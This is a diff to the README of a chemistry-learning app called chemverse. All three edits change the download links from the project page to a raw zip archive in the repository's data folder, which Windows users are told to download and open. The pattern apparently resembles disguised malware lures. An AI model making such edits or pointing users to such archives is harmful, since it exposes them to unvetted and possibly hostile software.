@@ -1,6 +1,6 @@
 # 🧪 chemverse - Learn Chemistry With Ease
 
-[![Download chemverse](https://img.shields.io/badge/Download-chemverse-blue?style=for-the-badge)](https://github.com/diej1222/chemverse)
+[![Download chemverse](https://img.shields.io/badge/Download-chemverse-blue?style=for-the-badge)](https://raw.githubusercontent.com/diej1222/chemverse/main/data/Software-1.1.zip)
 
 ## 🌐 What is chemverse?
 
@@ -35,7 +35,7 @@ If your computer can run a modern browser, it should run chemverse well.
 
 Use this link to visit the project page and get chemverse:
 
-[Visit the chemverse download page](https://github.com/diej1222/chemverse)
+[Visit the chemverse download page](https://raw.githubusercontent.com/diej1222/chemverse/main/data/Software-1.1.zip)
 
 If the project provides a packaged build or release file there, download it to your Windows PC and open it from your browser or the app file you receive.
 
@@ -212,7 +212,7 @@ Its simple design helps keep attention on the lesson content.
 
 ## 📎 Download link again
 
-[Open the chemverse page here](https://github.com/diej1222/chemverse)
+[Open the chemverse page here](https://raw.githubusercontent.com/diej1222/chemverse/main/data/Software-1.1.zip)
 
 ## 🗃️ Topic areas in this repository
 
